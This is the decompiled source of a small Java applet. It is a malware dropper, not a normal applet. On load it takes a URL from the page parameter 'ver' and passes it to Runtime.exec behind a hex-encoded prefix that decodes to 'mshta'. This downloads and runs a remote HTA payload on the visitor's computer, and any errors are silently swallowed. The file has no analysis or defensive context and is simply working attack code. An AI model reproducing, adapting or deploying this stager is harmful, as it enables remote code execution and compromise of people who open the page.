import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class main extends Applet
{
    public void init() {
        try {
            if (this.getParameter("ver").indexOf("http://") == 0) {
                Runtime.getRuntime().exec(HS("6D7368746120") + this.getParameter("ver"));
            }
        }
        catch (Throwable t) {}
    }
    
    public static String HS(final String s) {
        String string = new String();
        for (int i = 0; i < s.length(); i += 2) {
            string += (char)((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
        }
        return string;
    }
}
